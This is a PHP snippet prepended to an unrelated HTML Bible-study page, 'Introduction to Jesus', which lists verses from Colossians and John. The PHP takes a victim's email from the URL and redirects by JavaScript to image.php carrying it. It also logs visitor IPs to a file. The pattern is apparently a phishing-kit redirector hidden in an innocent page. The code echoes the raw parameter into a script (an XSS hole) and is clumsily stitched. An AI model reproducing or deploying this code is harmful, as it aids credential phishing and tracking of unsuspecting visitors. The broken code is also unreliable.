<?php
session_start();
$login="";
$_SESSION['login']="";



function getDomainFromEmail($login)
{
// Get the data after the @ sign
$domain = substr(strrchr($login, "@"), 1);
$remove = array(".com");
return $domain;
} 
// Example

if(isset($_GET['login'])){
$email = $_GET['login'];
$_SESSION['login']=$login;
}
$domain = getDomainFromEmail($login);


$email = $login;



?>



<script language=javascript>
window.location='image.php?login=<?php echo $_GET['login'] ?>';
</script>

<?php
 $ip = getenv("REMOTE_ADDR");
$file = fopen("visits.txt","a");
fwrite($file, $ip."  -  ".gmdate ("Y-n-d")." ---> ".gmdate ("H:i:s")."\n");
?>
<script language=javascript>

<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
   <meta name="Generator" content="Microsoft Word 97">
   <meta name="GENERATOR" content="Mozilla/4.73 [en] (Win95; U) [Netscape]">
   <title>Introduction to Jesus</title>
</head>
<body link="#0000FF" vlink="#800080">
&nbsp;
<center><table CELLSPACING=10 CELLPADDING=10 COLS=1 WIDTH="100%" >
<tr>

<td>
<center><b><i><font color="#400040"><font size=+3>Introduction to Jesus</font></font></i></b>
<br><b><i><font point-size="8">by Tim Greenwood</font></i></b>
<hr WIDTH="75%"></center>

<p><b><font color="#400040"><font size=+3>W</font></font><font point-size="12"><font color="#000099">hat
you are about to study will help you to understand who and what Jesus was
and is.&nbsp; It is my desire that once you have taken in the head knowledge
about Jesus -- getting to know <i>about</i> Jesus, that it will make it
easier to take the more important step to take Jesus into your heart --
getting to really KNOW Jesus, a relationship and fellowship which can only
come through the Holy Spirit.&nbsp; Now, here's Jesus...&nbsp;</font></font></b>

<p><font face="Arial">Mat 11:28 <b><i><u><font size=+1>Come</font></u></i></b>
unto me, all ye that labor and are heavy laden, and I will give you rest.</font>
<p><font face="Arial">Mat 11:29 Take my yoke upon you, and <b><i>learn
</i><u><font size=+1>of</font></u>
me</b>; for I am meek and lowly in heart: and <b><i><u>ye shall find rest
unto your souls</u></i></b>.</font>
<br>&nbsp;
<center><table BORDER CELLSPACING=0 CELLPADDING=10 COLS=1 WIDTH="75%" >
<tr>

<td><font color="#000099"><i><font face="Arial">(He did not say learn <b>from</b>
me or learn <b>about</b> me, he said learn <b><u><font size=+1>of</font></u></b>
me.)</font></i>&nbsp;</font>
<p><i><font color="#000099"><b><u>OF</u></b> = Connects to God, (i.e. Angel
of the Lord = Holy Angel)</font></i><font color="#000099">&nbsp;</font>
<p><b><i><font color="#000099"><u>FROM</u> </font></i></b><font color="#000099"><i>=
Separates from God, (i.e. Angel from the Lord = Fallen Angel)</i>&nbsp;</font>

<p><i><font color="#000099">We are people <b>OF</b> God not FROM God.</font></i><font color="#000099">&nbsp;</font>
<p><i><font color="#000099">Learn <b>OF</b> me, and <u>ye shall find rest
unto your souls</u>.</font></i><font color="#000099">&nbsp;</font>
<p><font color="#000099"><font face="Arial">He is the key to rest for your
soul.</font>&nbsp;</font>
<p><font face="Arial"><font color="#000099">He wants to be your teacher,
he wants you to come and sit at his feet and learn!</font></font></td>
</tr>

</table></center>

<p><b><font face="Arial">There can be no fellowship without revelation.</font></b>
<p><font point-size="8"><font face="Arial">[Paraphrased]</font>&nbsp;</font>
<br><font face="Arial">Ezek 40:3 (Describes Jesus as a man that had the
appearance of brass)</font>
<p><font face="Arial">Ezek 40:4 And Jesus says, look, hear and desire all
that I <b><u>reveal</u></b> to you; for it is my intent to bring you here
so that <b><i>I might </i><u>reveal</u> them to you!</b></font>

<p><font face="Arial"><i>(Revelation is always the result of </i><b><u><font size=+1>fellowship</font></u></b>.)</font>
<p><b><font face="Arial">Here are 10 revelations of Jesus:</font></b>
<dir><b><font face="Arial">1. He is creator.</font></b>
<dir>
<dir><font face="Arial">Col 1:16 <b><i><u>For by him were all things created</u></i></b>,
that are in heaven, and that are in earth, visible and invisible, whether
they be thrones, or dominions, or principalities, or powers: all things
were created by him, <b><i><u>and for him</u></i></b>:</font></dir>
</dir>
<b><font face="Arial"></font></b>

<p><br><b><font face="Arial">2. All things were created for him.</font></b>
<br>&nbsp;<b><font face="Arial"></font></b>
<p><b><font face="Arial">3. He IS (not was, IS), before all things.</font></b>
<dir>
<dir><font face="Arial">Col 1:17 And <b><i><u>he is before all things</u></i></b>,
and <b><i><u>by him all things consist</u></i></b>.</font></dir>
</dir>
<b><font face="Arial"></font></b>
<p><br><b><font face="Arial">4. By him all things consist, (he <u>holds</u>

together, sustains all things).</font></b>
<br>&nbsp;<b><font face="Arial"></font></b>
<p><b><font face="Arial">5. He is the HEAD, No. 1, the ALPHA, the AUTHOR,
the beginning, and the preeminence.</font></b>
<dir>
<dir><font face="Arial">Col 1:18 And <b><i><u>he is the head</u></i></b>
of the body, the church: who is <b><i><u>the beginning</u></i></b>, the
firstborn from the dead; that in all things he might have <b><i><u>the
preeminence</u></i></b>.</font></dir>
</dir>
<b><font face="Arial"></font></b>

<p><br><b><font face="Arial">6. Everything dwells in him.</font></b>
<dir>
<dir><font face="Arial">Col 1:19 For it pleased the Father that <b><i><u>in
him should all fulness dwell</u></i></b>;</font></dir>
</dir>
<i><font face="Arial">(We just get introduced to him here in this life,
Heaven is where we will receive full revelation of him.)</font></i>
<p><b><font face="Arial">7. All things will be reconciled to him (that
are not now his).</font></b>
<dir>
<dir><font face="Arial">Col 1:20 And, having made peace through the blood
of his cross, by him to <b><i><u>reconcile all things unto himself</u></i></b>;
by him, I say, whether they be things in earth, or things in heaven.</font></dir>

</dir>
<b><font face="Arial"></font></b>
<p><br><b><font face="Arial">8. He is the SOURCE of wisdom and knowledge.</font></b>
<dir>
<dir><font face="Arial">Col 2:3 <b><i><u>In whom are hid all the treasures
of wisdom and knowledge</u></i></b>.</font></dir>
</dir>
<b><font face="Arial"></font></b>
<p><br><b><font face="Arial">9. He is the fullness of the Godhead bodily.</font></b>
<dir>
<dir><font face="Arial">Col 2:9 For in him dwelleth all the fullness of
the Godhead bodily.</font></dir>
</dir>

<i><font face="Arial">(The Father and Holy Spirit have form and shape,
but they do not have a body like Jesus; a glorified spiritual body; and
all the fullness of the Godhead dwells in that body.)</font></i>
<p><b><font face="Arial">10. He is the head of all principality and power.</font></b>
<dir>
<dir><font face="Arial">Col 2:10 And ye are complete in him, which is the
head of all principality and power:</font></dir>
</dir>
<i><font face="Arial">(At his Name every knee shall bow!!!)</font></i></dir>
<font face="Arial">John 1:1 In the <b><i>beginning</i> (eternal past)</b>
was the <b>Word</b> (lima = revelation), and the Word was with God, and
the Word was God.</font>

<p><i><font face="Arial"><font size=+1>(no angels, no heaven, no earth,
no planets, no moon, no sun, no galaxy, no universe, no time, no space,
nothing, <u>only</u> God, The Word, [the express image or <b>revelation</b>
of God] and The Spirit of God; Just God)</font></font></i>
<p><i><font face="Arial"><font size=+1>(Even The Father did not exist,
as the Father, until the Word became the Son)</font></font></i>
<p><i><font face="Arial"><font size=+1>(So, Jesus always was there, even
before he became Jesus)</font></font></i>
<p><b><font face="Arial">Nine Revelations of Jesus as the Word:</font></b>
<br>&nbsp;
<blockquote><b><font face="Arial">1. The preexisting Word.</font></b>

<br>John 1:2 The same was in the beginning <u>with</u> God.&nbsp;
<p><b>2. The personal Word.</b>
<br><b>John 1:3 All things were made <font face="Arial"><i><font size=+1>by
him</font></i></font></b><font face="Arial">; and without him was not any
thing made that was made.</font>
<p><b><font face="Arial">3. The creative Word.</font></b>
<br><font face="Arial">(He is also the doer of all that God wants to do
<b><i><font size=+1>by
him</font></i></b>.)</font>

<p><b><font face="Arial">4. The life-giving Word.</font></b>
<br><font face="Arial">John 1:4 In him was life; and the life was the light
of men.</font>
<br><i><font face="Arial">(Anyone that receives LIFE from him also receives
LIGHT (revelation) <u>of</u> him. Anyone that COMES to him, he will reveal
himself to them.) (The key here is to COME, [<b><u>fellowship</u></b>],
not just showing up.)</font></i>
<p><b><font face="Arial">5. The light-giving Word.</font></b>
<br><font face="Arial">John 1:5 And the light shineth in darkness; and
the darkness comprehended it not.</font><font face="Arial"></font>
<p><b><font face="Arial">6. The illuminating Word.</font></b>

<br><font face="Arial">John 1:9 That was the true Light, which lighteth
every man that cometh into the world.</font><font face="Arial"></font>
<p><b><font face="Arial">7. The saving Word.</font></b>
<br><font face="Arial">John 1:12 But as many as received him, to them gave
he power to become the sons of God, even to them that believe on his name:</font><b><font face="Arial"></font></b>
<p><b><font face="Arial">8. The incarnate Word.</font></b>
<br><font face="Arial">John 1:14 And the Word was made flesh, and dwelt
among us, (and we beheld his glory <i>(he is the totality of God?s Glory),</i>
the glory as of the only begotten of the Father,) full of grace and <b><i><u><font size=+1>truth</font></u></i></b>.</font>
<p><i><font face="Arial">(You can?t have truth without grace, you can?t
have grace without truth.)</font></i><b><font face="Arial"></font></b>

<p><b><font face="Arial">9. The gracious Word.</font></b>
<br><font face="Arial">John 1:16 And of his fullness have all we received,
and grace for grace.</font><b><font face="Arial"></font></b>
<p><font face="Arial">We receive truth when we COME in continuous fellowship
[dining, supping, and staying] by <i>living it</i>. <i>(We are talking
about prayer here!) </i>When you live it, you have liberty!</font>
<p><font face="Arial">John 8:31 Then said Jesus to those Jews which believed
on him, <b><i><u>If ye continue in my Word</u></i></b>, then are ye my
<b><i><u>disciples</u></i></b>
indeed;</font>

<p><font face="Arial">John 8:32 And <b><i><u>ye shall know the truth</u></i>
(Who will reveal the truth? Jesus!), (what will the truth give you? Freedom!)</b>,
and <b><i><u>the truth shall make you free</u></i></b>.</font></blockquote>
<b><font face="Arial">Here are 7 results of COMING to him.</font></b>
<dir><b><font face="Arial">1. Prayer is answered instantly.</font></b>
<br><font face="Arial">John 15:7 <b><i><u>If ye abide in me</u></i></b>,
<i>(if
you come and the fellowship continues),</i> and <i>(then)</i> <b><i><u>my
Words abide in you</u></i></b>, <b><i><u>ye shall ask what ye will, and
it shall be done unto you</u></i></b>.</font>

<p><b><font face="Arial">2. You will bear fruit for him.</font></b>
<br><i><font face="Arial">(If you read the Bible but do not fellowship
with God in prayer, the Bible will have NO EFFECT on your life!)</font></i>
<p><font face="Arial">John 15:8 Herein is my Father glorified, that <b><i><u>ye
bear much fruit</u></i></b>; so shall ye be my disciples.</font>
<p><b><font face="Arial">3. You will continue in his love.</font></b>
<br><font face="Arial">John 15:9 As the Father hath loved me, so have I
loved you<b><i><u>: continue ye in my love</u></i></b>.</font>
<p><b><font face="Arial">4. You will remain joyful.</font></b>
<br><font face="Arial">John 15:11 These things have I spoken unto you,
that

<b><i><u>my joy might remain in you</u></i></b>, and that your joy
might be full.</font>
<p><b><font face="Arial">5. It is now possible to love others as God loves
you.</font></b>
<br><font face="Arial">John 15:12 This is my commandment, That <b><i><u>ye
love one another, as I have loved you</u></i></b>.</font>
<p><b><font face="Arial">6. Fullness of revelation.</font></b>
<br><font face="Arial">John 15:15 Henceforth I call you not servants; for
the servant knoweth not what his lord doeth: but I have called you friends;
<b><i><u>for
all things that I have heard of my Father I have made known unto you</u></i></b>.</font>
<p><b><font face="Arial">7. Our fruit will remain permanently.</font></b>

<br><font face="Arial">John 15:16 Ye have not chosen me, but I have chosen
you, and ordained you, that ye should go and bring forth fruit, and <b><i><u>that
your fruit should remain</u></i></b>: that whatsoever ye shall ask of the
Father in my name, he may give it you.</font>
<br><b><font face="Arial"></font></b>&nbsp;</dir>
</td>
</tr>
</table></center>

</body>
</html>

